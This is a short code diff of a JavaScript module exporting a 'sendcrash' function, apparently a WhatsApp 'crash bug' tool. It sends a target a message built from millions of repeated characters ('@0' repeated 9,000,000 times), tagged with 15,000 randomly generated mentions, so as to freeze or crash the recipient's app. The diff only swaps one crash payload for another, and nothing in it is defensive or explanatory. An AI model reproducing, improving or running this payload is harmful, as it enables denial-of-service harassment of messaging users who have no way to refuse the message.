@@ -7,22 +7,21 @@ const aorbugz = {
 };
 
 async function sendcrash(target, Ptcp = false) {
-    const crashText = "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "ꦾ".repeat(5000000); // Teks berat
-    const mentionedJid = [
-        "6281991410940@s.whatsapp.net",
-        ...Array.from({ length: 15000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) // Daftar mention
-    ];
-
     await aorbugz.relayMessage(target, {
         extendedTextMessage: {
-            text: crashText,
+            text: "⩟⬦𪲁 H4NBUG!𝐒 -" + "@0".repeat(9000000),
             contextInfo: {
-                mentionedJid: mentionedJid,
+                mentionedJid: [
+                    "0@s.whatsapp.net",
+                    ...Array.from({
+                        length: 15000
+                    }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
+                ],
                 stanzaId: "1234567890ABCDEF",
                 participant: "0@s.whatsapp.net",
+         
             }
         }
     }, Ptcp ? { participant: { jid: target } } : {});
 }
-
 module.exports = sendcrash;
